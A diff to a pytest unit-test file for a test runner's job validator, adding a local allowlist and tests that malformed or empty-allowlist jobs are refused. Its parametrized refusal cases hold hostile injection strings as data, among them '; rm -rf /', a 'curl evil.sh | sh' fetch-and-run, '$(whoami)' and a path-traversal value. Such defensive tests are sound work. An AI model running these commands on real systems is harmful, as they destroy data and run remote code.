@@ -17,11 +17,22 @@ from test_server.reporter import JobReporter
 pytestmark = pytest.mark.unit
 
 
+#: The runner's OWN allowlist, which is the point of `validate` -- it must not
+#: be taken from the job, and must not be fetched from the edge, or a compromised
+#: edge would simply send a wider one and the re-check would agree with it.
+#: Fictional values, so this file cannot become a place house names live.
+ALLOW = {
+    "allowed_products": frozenset({"alpha", "beta"}),
+    "allowed_servers": frozenset({"sandbox", "staging"}),
+    "allowed_test_scopes": frozenset({"smoke", "full"}),
+}
+
+
 def job(**overrides) -> dict:
     base = {
         "job_id": "abc123",
-        "product": "webapp",
-        "server": "staging",
+        "product": "alpha",
+        "server": "sandbox",
         "select": "",
         "marker": "",
         "slack_channel": "#testing",
@@ -34,7 +45,7 @@ def job(**overrides) -> dict:
 # ── defence in depth ─────────────────────────────────────────────────────────
 
 def test_a_well_formed_job_is_accepted() -> None:
-    assert validate(job()) is None
+    assert validate(job(), **ALLOW) is None
 
 
 @pytest.mark.parametrize(
@@ -42,7 +53,7 @@ def test_a_well_formed_job_is_accepted() -> None:
     [
         ("product", "../../etc"),
         ("product", "unknown"),
-        ("server", "prod"),          # deliberately not an allowed environment
+        ("server", "prod"),          # deliberately not in ALLOW
         ("server", "; rm -rf /"),
         ("select", 'smoke"; curl evil.sh | sh; "'),
         ("marker", "$(whoami)"),
@@ -57,7 +68,25 @@ def test_a_job_that_fails_the_allowlist_is_refused(field, value) -> None:
     last thing between a payload off the network and a subprocess on an
     internal machine.
     """
-    assert validate(job(**{field: value})) is not None
+    assert validate(job(**{field: value}), **ALLOW) is not None
+
+
+def test_an_empty_allowlist_refuses_everything_rather_than_allowing_it() -> None:
+    """The failure this whole boundary exists to avoid, at the last checkpoint.
+
+    A runner started with no RUNTESTS_PRODUCTS must run nothing, not run
+    anything. `x not in frozenset()` falls the safe way by construction, but the
+    opposite reading -- "no allowlist configured, so no restriction" -- is
+    exactly the shape of the bug NEH-1119 fixed one layer up, so it is pinned
+    here rather than left to the reader.
+    """
+    assert validate(
+        job(), allowed_products=frozenset(), allowed_servers=frozenset()
+    ) is not None
+
+
+def test_the_runner_refuses_a_test_scope_outside_its_own_allowlist() -> None:
+    assert validate(job(test_scope="exfiltrate"), **ALLOW) is not None
 
 
 # ── the command ──────────────────────────────────────────────────────────────
